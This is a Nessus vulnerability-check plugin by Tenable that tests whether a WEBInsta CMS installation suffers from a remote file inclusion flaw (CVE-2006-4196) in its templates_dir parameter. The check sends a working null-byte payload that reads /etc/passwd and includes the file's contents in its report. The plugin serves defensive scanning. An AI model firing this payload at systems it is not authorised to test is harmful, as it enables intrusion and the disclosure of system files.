#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22206);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2006-4196");
  script_bugtraq_id(19489);
  script_osvdb_id(27948);
  script_xref(name:"EDB-ID", value:"2175");

  script_name(english:"WEBInsta CMS index.php templates_dir Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using WEBInsta CMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running WEBInsta CMS, a content management system
written in PHP. 

The version of WEBInsta CMS installed on the remote host fails to
sanitize user-supplied input to the 'templates_dir' parameter of the
'index.php' script before using it to include PHP code.  Regardless of
PHP's 'register_globals' setting, an unauthenticated attacker may be
able to exploit these flaws to view arbitrary files on the remote host
or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
  # http://web.archive.org/web/20080916193912/http://my.opera.com/atomo64/blog/show.dml/443167
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?0253b50e" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Webinsta CMS version 0.4.0a or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/08/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/08/13");
 script_cvs_date("$Date: 2012/11/01 16:09:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:webinsta:cms");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2012 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/webinsta", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "templates_dir=", file
    ), 
    port:port
  );
  if (isnull(w)) exit(0);
  res = w[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream".
    egrep(pattern:"main\(/etc/passwd\\0template.def\.php.+ failed to open stream", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction.
    egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<!DOCTYPE");

    if (contents)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
